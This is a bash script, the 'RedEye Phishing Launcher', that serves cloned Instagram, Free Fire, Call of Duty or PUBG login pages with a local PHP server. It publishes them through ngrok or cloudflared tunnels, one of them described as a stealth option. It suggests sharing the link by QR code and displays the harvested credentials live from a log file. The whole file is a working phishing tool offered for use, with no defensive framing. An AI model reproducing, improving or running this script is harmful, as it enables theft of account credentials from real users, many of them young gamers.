#!/bin/bash

RED='\033[1;31m'
GRN='\033[1;32m'
CY='\033[1;36m'
YLW='\033[1;33m'
RST='\033[0m'

clear

echo -e "${RED}"
echo "░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        "
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        "
echo "░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░  ░▒▓██████▓▒░░▒▓██████▓▒░   "
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░        "
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░        "
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓████████▓▒░"
echo -e "${RST}"
echo -e "${CY}🔥 RedEye Phishing Launcher 🔥${RST}"
echo "CREATOR : @ethicalphoenix" 
echo

echo -e "${YLW}1) 🎯 Instagram Login"
echo "2) 🔥 Free Fire V-Badge"
echo "3) 🎮 Call of Duty"
echo "4) 💣 PUBG Mobile"
echo "5) ❌ Exit${RST}"
echo
read -p "📌 Select your target [1-5]: " SITE

case $SITE in
  1) SITE_NAME="instagram" ;;
  2) SITE_NAME="freefire" ;;
  3) SITE_NAME="cod" ;;
  4) SITE_NAME="pubg" ;;
  5) echo -e "${RED}❌ Exiting...${RST}"; exit 0 ;;
  *) echo -e "${RED}Invalid selection!${RST}"; exit 1 ;;
esac

echo
echo -e "${YLW}🌐 Choose delivery method:"
echo "1) Ngrok (public link)"
echo "2) Localhost (127.0.0.1)"
echo "3) Cloudflared (stealth alt to ngrok)${RST}"
echo
read -p "🚀 Select [1-3]: " METHOD
echo

echo -e "${CY}📡 Starting PHP server for ${SITE_NAME}...${RST}"
cd sites/$SITE_NAME || { echo -e "${RED}❌ Site '$SITE_NAME' not found.${RST}"; exit 1; }
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

case $METHOD in
  1)
    echo -e "${CY}🌐 Launching Ngrok tunnel...${RST}"
    rm -f ngroklog.txt 2>/dev/null
    ngrok http 8080 > ngroklog.txt 2>&1 &
    NGROK_PID=$!
    sleep 7  # Increased sleep time for ngrok to initialize
    
    # Try multiple ways to get ngrok URL
    LINK=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[^"]*\.ngrok-free\.app')
    if [ -z "$LINK" ]; then
        LINK=$(grep -o 'https://[0-9a-z.-]*\.ngrok-free\.app' ngroklog.txt | head -n 1)
    fi
    if [ -z "$LINK" ]; then
        LINK=$(grep -o 'https://[0-9a-z.-]*\.ngrok\.io' ngroklog.txt | head -n 1)
    fi
    ;;
    
  2)
    LINK="http://127.0.0.1:8080"
    ;;
    
  3)
    echo -e "${CY}🌐 Launching Cloudflared tunnel...${RST}"
    rm -f cloudlog.txt 2>/dev/null
    cloudflared tunnel --url http://localhost:8080 --no-autoupdate > cloudlog.txt 2>&1 &
    CLOUDFLARED_PID=$!
    sleep 7  # Increased sleep time for cloudflared
    
    for i in {1..10}; do
      LINK=$(grep -aoE "https://[a-zA-Z0-9.-]+\.trycloudflare\.com" cloudlog.txt | head -n1)
      [ -n "$LINK" ] && break
      sleep 1
    done
    ;;
    
  *)
    echo -e "${RED}❌ Invalid method selected.${RST}"
    kill $PHP_PID 2>/dev/null
    exit 1
    ;;
esac

if [[ $LINK == https://* || $LINK == http://* ]]; then
  echo -e "${GRN}✅ Tunnel is live: ${CY}$LINK${RST}"
  echo -e "${YLW}💡 Tip: Use QR code generators to share the link easily${RST}"
else
  echo -e "${RED}❌ Failed to retrieve tunnel URL. Check these:${RST}"
  echo -e "1. Is ngrok/cloudflared properly installed?"
  echo -e "2. Try increasing sleep time in script (line 56/71)"
  echo -e "3. Check logs: ngroklog.txt or cloudlog.txt"
  kill $PHP_PID 2>/dev/null
  [ -n "$NGROK_PID" ] && kill $NGROK_PID 2>/dev/null
  [ -n "$CLOUDFLARED_PID" ] && kill $CLOUDFLARED_PID 2>/dev/null
  exit 1
fi

echo
mkdir -p "../../logs"
touch "../../logs/${SITE_NAME}.log"
echo -e "${YLW}📁 Captured creds saved in: ${CY}logs/${SITE_NAME}.log${RST}"
echo -e "${RED}🔴 Press Ctrl+C to exit anytime${RST}"
echo

# Cleanup function
cleanup() {
  echo -e "\n${RED}🛑 Stopping all services...${RST}"
  kill $PHP_PID 2>/dev/null
  [ -n "$NGROK_PID" ] && kill $NGROK_PID 2>/dev/null
  [ -n "$CLOUDFLARED_PID" ] && kill $CLOUDFLARED_PID 2>/dev/null
  exit 0
}
trap cleanup SIGINT

tail -f "../../logs/${SITE_NAME}.log"
